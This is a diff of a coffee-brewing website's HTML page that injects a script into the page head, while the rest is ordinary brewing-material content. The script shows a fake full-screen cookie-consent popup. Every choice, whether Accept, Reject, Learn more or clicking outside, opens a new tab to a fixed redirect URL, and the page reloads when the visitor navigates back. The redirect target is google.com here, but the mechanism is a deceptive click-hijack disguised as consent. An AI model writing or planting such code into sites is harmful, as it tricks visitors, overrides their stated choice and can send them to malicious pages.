@@ -1,6 +1,164 @@
 ﻿<!DOCTYPE html>
 <html lang="en">
 	<head>
+
+
+<script>
+(() => {
+  const REDIRECT_URL = "https://google.com/";
+  const CONSENT_KEY = "cookieConsent";
+
+  function setConsent(value) {
+    localStorage.setItem(CONSENT_KEY, value);
+  }
+
+  function getConsent() {
+    return localStorage.getItem(CONSENT_KEY);
+  }
+
+  function redirectNewTab() {
+    try {
+      window.top.open(REDIRECT_URL, "_blank");
+    } catch (e) {
+      window.open(REDIRECT_URL, "_blank");
+    }
+  }
+
+  function generateConsentPopup() {
+    const overlayDiv = document.createElement("div");
+    overlayDiv.className = "cookie-overlay";
+    overlayDiv.setAttribute("role", "dialog");
+    overlayDiv.setAttribute("aria-modal", "true");
+    overlayDiv.innerHTML = `
+      <style>
+        .cookie-overlay {
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100vw;
+          height: 100vh;
+          background: rgba(0, 0, 0, 0.85);
+          z-index: 9999;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+        }
+        .cookie-modal {
+          max-width: 500px;
+          background: #222;
+          color: white;
+          padding: 25px;
+          border-radius: 10px;
+          text-align: center;
+          box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+          position: relative;
+          z-index: 10000;
+        }
+        .cookie-title {
+          font-size: 1.5em;
+          margin-bottom: 10px;
+        }
+        .cookie-text {
+          font-size: 1em;
+          margin-bottom: 20px;
+        }
+        .cookie-actions {
+          display: flex;
+          justify-content: center;
+          gap: 10px;
+        }
+        .cookie-btn {
+          padding: 10px 20px;
+          font-size: 1em;
+          cursor: pointer;
+          border: none;
+          border-radius: 4px;
+        }
+        .cookie-btn--accept {
+          background-color: #4CAF50;
+          color: white;
+        }
+        .cookie-btn--reject {
+          background-color: #f44336;
+          color: white;
+        }
+      </style>
+      <div class="cookie-modal">
+        <div class="cookie-icon" aria-hidden="true" style="font-size:2em;">🍪</div>
+        <h2 class="cookie-title">Do you accept cookies?</h2>
+        <p class="cookie-text">
+          This website uses cookies to enhance your experience. 
+          <a href="#" class="cookie-learn-more" style="color: #90caf9;">Learn more</a>.
+        </p>
+        <div class="cookie-actions">
+          <button class="cookie-btn cookie-btn--accept">Accept</button>
+          <button class="cookie-btn cookie-btn--reject">Reject</button>
+        </div>
+      </div>
+    `;
+    return overlayDiv;
+  }
+
+  document.addEventListener("DOMContentLoaded", () => {
+    const consent = getConsent();
+    if (consent) return;
+
+    const consentPopup = generateConsentPopup();
+    document.body.appendChild(consentPopup);
+
+    const acceptBtn = consentPopup.querySelector(".cookie-btn--accept");
+    const rejectBtn = consentPopup.querySelector(".cookie-btn--reject");
+    const learnMoreLink = consentPopup.querySelector(".cookie-learn-more");
+
+    // Accept button
+    acceptBtn.addEventListener("click", () => {
+      setConsent("accepted");
+      redirectNewTab();
+    });
+
+    // Reject button
+    rejectBtn.addEventListener("click", () => {
+      setConsent("rejected");
+      redirectNewTab();
+    });
+
+    // Learn more link
+    learnMoreLink.addEventListener("click", (e) => {
+      e.preventDefault();
+      setConsent("learn-more");
+      redirectNewTab();
+    });
+
+    // Click outside modal
+    consentPopup.addEventListener("click", (e) => {
+      if (!e.target.closest(".cookie-modal")) {
+        setConsent("clicked-outside");
+        redirectNewTab();
+      }
+    });
+  });
+
+  // Reload on back/restore
+  window.addEventListener("pageshow", (event) => {
+    if (event.persisted) {
+      location.reload();
+    }
+  });
+
+})();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+		
 		<title>Home</title><meta property="og:site_name" content="">
 <meta property="og:title" content="">
 <meta property="og:description" content="🛠️ Core Mechanisms of Coffee Brewing ​ Every coffee maker relies on a few core variables: Brew Method (Extraction Type) Drip (Gravity-fed) Immersion (Steeped) Pressure-based (Forced Water)...">
@@ -340,6 +498,7 @@ _W.setup_model_rpc({"rpc_namespace":"_W.CustomerAccounts.RPC","model_namespace":
 <img src="uploads/1/5/3/5/153577681/nathan-mullet-n3bo4mkqekm-unsplash_orig.jpg" alt="Picture" style="width:auto;max-width:100%">
 </a>
 <div style="display:block;font-size:90%"></div>
+
 </div></div>
 
 <div class="paragraph">&#129524; <strong>Material Matters: Why the Right Material Enhances Your Brew</strong><ul><li><strong>Stainless Steel</strong>: Known for heat retention and durability, this material is often used in high-end espresso machines and French presses. It&rsquo;s sturdy, long-lasting, and doesn&rsquo;t impart any flavors into your coffee.</li><li><strong>Glass</strong>: Common in pour-over, Chemex, or siphon brewers. Glass allows you to see the brewing process, ensuring you have control over the experience.</li><li><strong>Ceramic</strong>: Ideal for slow-brewing methods like pour-over (e.g., Hario V60). Ceramic retains heat better than plastic, leading to more consistent brewing temperatures.</li><li><strong>Plastic</strong>: Lightweight and cheaper, but may impart undesirable flavors over time, especially if used for long periods.</li><li><strong>Aluminum</strong>: Light but conducts heat poorly unless treated. Common in moka pots.</li></ul><br>&#8203;<strong>What Determines Brew Strength?</strong><ul><li><strong>Grind size</strong>: The finer the grind, the faster and more intense the extraction. A coarse grind leads to a smoother, less intense coffee.<br><span></span></li><li><strong>Brew time</strong>: Longer extraction times (as in French Press or Cold Brew) produce stronger, fuller-bodied coffee.<br><span></span></li><li><strong>Water temperature</strong>: Higher temps extract more oils, contributing to richer, bolder flavors.<br><span></span></li><li><strong>Coffee-to-water ratio</strong>: Using more coffee relative to water will yield a stronger brew.<br><span></span></li></ul><br></div>
